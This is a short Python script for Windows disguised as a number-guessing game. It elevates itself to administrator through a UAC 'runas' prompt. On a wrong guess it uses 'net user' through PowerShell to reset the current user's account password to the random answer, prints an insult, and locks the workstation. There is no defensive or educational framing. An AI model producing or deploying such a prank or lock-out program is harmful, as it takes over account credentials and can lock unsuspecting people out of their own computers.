import os
import subprocess
import time
import ctypes
import getpass
import random
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
    sys.exit()

def lock_workstation():
    ctypes.windll.user32.LockWorkStation()

def change_password(username, new_password):
    try:
        command = f'net user {username} {new_password}'
        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True)
        if result.returncode == 0:
            print("Password changed successfully.")
        else:
            print("Error changing password:", result.stderr)
    except Exception as e:
        print("Exception occurred:", e)

if __name__ == "__main__":
    correctAnswer=random.randint(1,3)
    username = getpass.getuser()

    if not is_admin():
        run_as_admin()


    guess=input("Enter your Guess! (its either 1, 2 or 3 digit number) ")
    if int(guess) == correctAnswer:
        print("You got it right!")
        time.sleep(5)
    else:
        change_password(username, correctAnswer)
        print("wrong! bloody idiot! keep trying in the lock screen")
        time.sleep(5)
        lock_workstation()
